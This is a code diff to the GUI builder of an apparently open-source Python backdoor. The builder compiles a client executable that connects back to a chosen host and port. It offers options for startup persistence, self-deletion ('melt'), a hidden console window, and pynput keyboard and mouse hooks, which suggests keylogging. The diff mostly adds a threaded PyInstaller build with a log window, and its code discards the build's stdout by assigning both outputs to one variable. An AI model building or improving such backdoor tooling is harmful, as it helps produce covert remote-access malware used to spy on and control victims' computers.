@@ -5,16 +5,25 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-import os
-import shutil
+import platform
+import threading
 from tkinter import *
 from tkinter.ttk import *
 import tkinter.messagebox
+from tkinter import scrolledtext
 from tkinter import filedialog
+
+import os
+import shutil
+import subprocess
 import socket
 import sys
 import urllib.request
 import site
+
+
+def null_callback():
+    pass
 
 
 def check_main_files():
@@ -75,10 +84,18 @@ def save_files(client_args, server_args):
         file.close()
 
 
+def check_windows():
+    if not "windows" in platform.system().lower():
+        tkinter.messagebox.showerror("Error", "You need a windows computer to build the client")
+        sys.exit(0)
+
+
 class Setup:
     def __init__(self):
+
         os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
         check_main_files()
+        check_windows()
 
         self.pyinstaller = get_pyinstaller()
 
@@ -93,11 +110,15 @@ class Setup:
         self.icon_path = None
         self.is_hostname = False
         self.is_console = False
+        self.log = ""
 
         self.create_ui()
 
     def create_ui(self):
         self.root = Tk()
+
+        # dummy value
+        self.root_log = Label()
 
         self.root.geometry("500x200")
         self.root.resizable(0, 0)
@@ -151,23 +172,53 @@ class Setup:
 
         self.root.mainloop()
 
+    def default_build_ui_state(self):
+        self.root.protocol("WM_DELETE_WINDOW", self.root.destroy)
+        self.build_btn["state"] = "enabled"
+        self.build_btn.config(text="Build")
+
+    def disable_build_ui(self):
+        self.build_btn["state"] = "disabled"
+        self.build_btn.config(text="Please wait...")
+        self.root_log.destroy()
+        self.root.protocol("WM_DELETE_WINDOW", null_callback)
+
+    def create_log_ui(self, log):
+        self.root_log = Toplevel(self.root)
+        self.root_log.title("Pyinstaller log")
+        self.root_log.geometry("500x300")
+
+        self.root_log_frame = LabelFrame(self.root_log, text="Log")
+        self.root_log_frame.pack(padx=8, pady=8, fill=BOTH, expand=YES)
+
+        self.log_sbtxt = scrolledtext.ScrolledText(self.root_log_frame)
+        self.log_sbtxt.pack(padx=4, pady=4, fill=BOTH, expand=YES)
+
+        self.log_sbtxt.insert(INSERT, log)
+        self.log_sbtxt.configure(state="disabled")
+
     def console_btn_callback(self):
         self.console_btn["state"] = "disabled"
 
         self.is_console = True
 
     def build_btn_callback(self):
-        self.build_btn["state"] = "disabled"
-
         port = self.port_et.get()
+
+        if not isinstance(self.host_widg, Entry):
+            self.host = self.host_widg["text"]
+        else:
+            self.host = self.host_widg.get()
 
         if not port.isdigit():
             tkinter.messagebox.showerror("Build", "You must enter numeric value for the port")
         elif not 1024 <= int(port) <= 65535:
             tkinter.messagebox.showerror("Build", "Please enter a port number between 1024 and 65535")
         else:
+            self.disable_build_ui()
+
             client_args = \
-                [f"'{self.host}'", str(port),  str(self.is_hostname), str(self.add_startup),  str(self.melt)]
+                [f"'{self.host}'", str(port), str(self.is_hostname), str(self.add_startup), str(self.melt)]
 
             server_args = [str(port)]
 
@@ -192,11 +243,19 @@ class Setup:
             if self.icon_path:
                 icon_command = f"--icon {self.icon_path}"
 
-            os.system(
-                f"{self.pyinstaller} src/client.py {upx_command}--hidden-import pynput.keyboard._win32 --hidden-import "
-                f"pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl --exclude-module tk "
-                f"--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter --onefile {windowed}"
-                f"{icon_command}")
+            command_arg = f"{self.pyinstaller} src/client.py {upx_command}--hidden-import pynput.keyboard._win32 " \
+                          f"--hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl " \
+                          f"--exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module " \
+                          f"Tkinter --onefile {windowed}{icon_command} "
+
+            def run_command():
+                self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
+                                                stdin=subprocess.PIPE)
+                log, log = self.command.communicate()
+                self.default_build_ui_state()
+                self.create_log_ui(log)
+
+            threading.Thread(target=run_command, daemon=False).start()
 
     def add_icon_btn_callback(self):
         path = filedialog.askopenfile(parent=self.root, title="Choose icon", filetypes=[("icon", ".ico")])
@@ -242,14 +301,11 @@ class Setup:
 
         match value:
             case "Local IP":
-                self.host = self.local_ip
+                self.host_widg["text"] = self.local_ip
             case "External IP":
-                self.host = self.external_ip
+                self.host_widg["text"] = self.external_ip
             case "Loopback":
-                self.host = self.loopback_ip
-
-        if not isinstance(self.host_widg, Entry):
-            self.host_widg["text"] = self.host
+                self.host_widg["text"] = self.loopback_ip
 
 
 if __name__ == "__main__":
